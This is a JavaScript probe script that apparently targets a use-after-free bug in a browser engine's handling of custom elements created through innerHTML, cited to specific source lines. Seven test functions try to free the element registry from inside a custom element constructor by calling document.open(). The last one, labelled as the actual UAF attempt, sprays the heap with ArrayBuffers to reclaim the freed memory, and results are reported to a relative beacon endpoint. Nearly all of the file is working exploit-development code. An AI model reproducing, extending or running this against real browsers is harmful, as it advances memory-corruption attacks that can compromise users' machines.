// p131 — Custom Element constructor UAF via innerHTML
// Bug: HTMLConstructionSite.cpp:791-799
//   elementInterface = findCustomElementInterface(...)  ← raw pointer
//   element = elementInterface->createElement(ownerDocument)  ← JS constructor runs
//   element->enqueueToUpgrade(*elementInterface)  ← UAF if constructor freed the registry
//
// Only fires on fragment parsing path (innerHTML), NOT document parsing
//
// Trigger: define CE → innerHTML containing that CE → CE constructor
//          calls document.open() → destroys registry → freed interface
//
// Beacon prefix: V131C-
(function(){
var rid='v131c'+Math.random().toString(36).slice(2,12);
function beacon(tag,data){
  var body=typeof data==='object'?JSON.stringify(data):String(data);
  try{navigator.sendBeacon('/beacon/V131C-'+tag,JSON.stringify({r:rid,b:body}));}catch(e){}
  try{fetch('/beacon/V131C-'+tag,{method:'POST',body:JSON.stringify({r:rid,b:body}),keepalive:true}).catch(function(){});}catch(e2){}
}
beacon('L','probe131-start');

// ======== C1: Basic CE constructor via innerHTML ========
function testC1(){
  var r={};
  try{
    var constructorRan=false;
    var constructorCtx={};

    class TestEl extends HTMLElement {
      constructor(){
        super();
        constructorRan=true;
        constructorCtx.tagName=this.tagName;
        constructorCtx.isConnected=this.isConnected;
      }
    }
    customElements.define('test-c1',TestEl);

    var div=document.createElement('div');
    document.body.appendChild(div);
    div.innerHTML='<test-c1></test-c1>';

    r.constructorRan=constructorRan;
    r.tagName=constructorCtx.tagName;
    r.isConnected=constructorCtx.isConnected;
    r.childCount=div.children.length;
    r.childTag=div.children[0]?div.children[0].tagName:'none';
    div.remove();
  }catch(e){
    r.err=e.constructor.name+':'+String(e.message||'').slice(0,80);
  }
  return r;
}

// ======== C2: CE constructor calls document.open() ========
// This is the UAF trigger — document.open() should destroy the registry
function testC2(){
  var r={};
  try{
    var constructorRan=false;
    var docOpenResult=null;
    var docOpenErr=null;

    class NukeEl extends HTMLElement {
      constructor(){
        super();
        constructorRan=true;
        try{
          document.open();
          docOpenResult='opened';
        }catch(e){
          docOpenErr=e.constructor.name+':'+String(e.message||'').slice(0,60);
        }
      }
    }
    customElements.define('nuke-c2',NukeEl);

    var div=document.createElement('div');
    document.body.appendChild(div);

    try{
      div.innerHTML='<nuke-c2></nuke-c2>';
      r.innerHTMLOK=true;
    }catch(e){
      r.innerHTMLErr=e.constructor.name+':'+String(e.message||'').slice(0,80);
    }

    r.constructorRan=constructorRan;
    r.docOpenResult=docOpenResult;
    r.docOpenErr=docOpenErr;
  }catch(e){
    r.err=e.constructor.name+':'+String(e.message||'').slice(0,80);
  }
  return r;
}

// ======== C3: CE constructor re-defines the element ========
// customElements.define() during constructor — replaces registry entry
function testC3(){
  var r={};
  try{
    var phase=0;
    var redefineErr=null;

    class OrigEl extends HTMLElement {
      constructor(){
        super();
        phase=1;
        try{
          customElements.define('redef-c3',class extends HTMLElement{
            constructor(){super();phase=3;}
          });
          redefineErr='no-error';
        }catch(e){
          redefineErr=e.constructor.name+':'+String(e.message||'').slice(0,60);
        }
        phase=2;
      }
    }
    customElements.define('redef-c3',OrigEl);

    var div=document.createElement('div');
    document.body.appendChild(div);
    try{
      div.innerHTML='<redef-c3></redef-c3>';
    }catch(e){
      r.innerHTMLErr=e.constructor.name;
    }

    r.phase=phase;
    r.redefineErr=redefineErr;
    div.remove();
  }catch(e){
    r.err=e.constructor.name+':'+String(e.message||'').slice(0,80);
  }
  return r;
}

// ======== C4: CE constructor navigates iframe ========
// iframe.contentDocument.open + innerHTML with CE from parent registry
function testC4(){
  var r={};
  try{
    var iframe=document.createElement('iframe');
    document.body.appendChild(iframe);
    var iframeDoc=iframe.contentDocument;

    var constructorRan=false;
    var ctxDoc=null;

    class IframeEl extends HTMLElement {
      constructor(){
        super();
        constructorRan=true;
        ctxDoc=this.ownerDocument===iframeDoc?'iframe':'main';
      }
    }

    // Define in main document
    customElements.define('iframe-c4',IframeEl);

    // innerHTML in main document
    var div=document.createElement('div');
    document.body.appendChild(div);
    div.innerHTML='<iframe-c4></iframe-c4>';

    r.constructorRan=constructorRan;
    r.ctxDoc=ctxDoc;
    r.mainChildTag=div.children[0]?div.children[0].tagName:'none';

    // Also try adoptNode from iframe
    try{
      var el=document.createElement('iframe-c4');
      iframeDoc.adoptNode(el);
      r.adoptOK=true;
    }catch(e){
      r.adoptErr=e.constructor.name;
    }

    div.remove();
    iframe.remove();
  }catch(e){
    r.err=e.constructor.name+':'+String(e.message||'').slice(0,80);
  }
  return r;
}

// ======== C5: CE constructor removes/replaces document body ========
function testC5(){
  var r={};
  try{
    var phase='init';

    class BodyKillEl extends HTMLElement {
      constructor(){
        super();
        phase='constructor';
        try{
          document.body.innerHTML='';
          phase='bodyCleared';
        }catch(e){
          r.clearErr=e.constructor.name;
        }
      }
    }
    customElements.define('bodykill-c5',BodyKillEl);

    var div=document.createElement('div');
    document.body.appendChild(div);
    try{
      div.innerHTML='<bodykill-c5></bodykill-c5>';
      r.innerHTMLOK=true;
    }catch(e){
      r.innerHTMLErr=e.constructor.name+':'+String(e.message||'').slice(0,80);
    }
    r.phase=phase;
    r.bodyExists=!!document.body;
    r.bodyChildCount=document.body?document.body.childNodes.length:-1;
  }catch(e){
    r.err=e.constructor.name+':'+String(e.message||'').slice(0,80);
  }
  return r;
}

// ======== C6: CE constructor with document.open on fresh document ========
// Use DOMParser to create a document, then innerHTML with CE
function testC6(){
  var r={};
  try{
    var constructorRan=false;
    var docOpenDone=false;

    // Create a detached document via DOMParser
    var parser=new DOMParser();
    var doc=parser.parseFromString('<html><body></body></html>','text/html');

    class DetachedEl extends HTMLElement {
      constructor(){
        super();
        constructorRan=true;
        try{
          doc.open();
          docOpenDone=true;
        }catch(e){
          r.docOpenErr=e.constructor.name+':'+String(e.message||'').slice(0,60);
        }
      }
    }
    customElements.define('detached-c6',DetachedEl);

    var container=document.createElement('div');
    document.body.appendChild(container);
    try{
      container.innerHTML='<detached-c6></detached-c6>';
      r.innerHTMLOK=true;
    }catch(e){
      r.innerHTMLErr=e.constructor.name;
    }

    r.constructorRan=constructorRan;
    r.docOpenDone=docOpenDone;
    container.remove();
  }catch(e){
    r.err=e.constructor.name+':'+String(e.message||'').slice(0,80);
  }
  return r;
}

// ======== C7: The actual UAF attempt — document.open in CE during innerHTML ========
// Spray heap after document.open to reclaim freed CustomElementRegistry memory
function testC7(){
  var r={};
  try{
    var survived=false;
    var crashType='none';

    class UafEl extends HTMLElement {
      constructor(){
        super();
        try{
          // document.open() destroys the current document and rebuilds it
          // This should free the CustomElementRegistry and JSCustomElementInterface
          document.open();
          document.write('<html><body></body></html>');
          document.close();

          // Spray heap to reclaim freed memory
          var sprays=[];
          for(var s=0;s<200;s++){
            sprays.push(new ArrayBuffer(64));
          }

          survived=true;
        }catch(e){
          crashType=e.constructor.name+':'+String(e.message||'').slice(0,60);
        }
      }
    }

    // Only define if not already defined
    try{
      customElements.define('uaf-c7',UafEl);
    }catch(e){
      r.defineErr=e.constructor.name;
    }

    var div=document.createElement('div');
    document.body.appendChild(div);

    try{
      div.innerHTML='<uaf-c7></uaf-c7>';
      r.innerHTMLOK=true;
    }catch(e){
      r.innerHTMLErr=e.constructor.name+':'+String(e.message||'').slice(0,80);
    }

    r.survived=survived;
    r.crashType=crashType;
  }catch(e){
    r.err=e.constructor.name+':'+String(e.message||'').slice(0,80);
  }
  return r;
}

// ======== Run all ========
async function runAll(){
  var tests=[
    {name:'C1-BASIC-CE',fn:testC1},
    {name:'C2-DOC-OPEN',fn:testC2},
    {name:'C3-REDEFINE',fn:testC3},
    {name:'C4-IFRAME',fn:testC4},
    {name:'C5-BODY-KILL',fn:testC5},
    {name:'C6-DETACHED',fn:testC6},
    {name:'C7-UAF-SPRAY',fn:testC7}
  ];
  for(var t=0;t<tests.length;t++){
    beacon(tests[t].name+'-PRE','starting');
    try{
      var result=tests[t].fn();
      beacon(tests[t].name,result||{});
    }catch(e){
      beacon(tests[t].name,{fatal:e.constructor.name+':'+String(e.message||'').slice(0,80)});
    }
    // Small delay between tests
    await new Promise(function(resolve){setTimeout(resolve,500);});
  }
  beacon('DONE','all-'+tests.length);
}
runAll();
})();
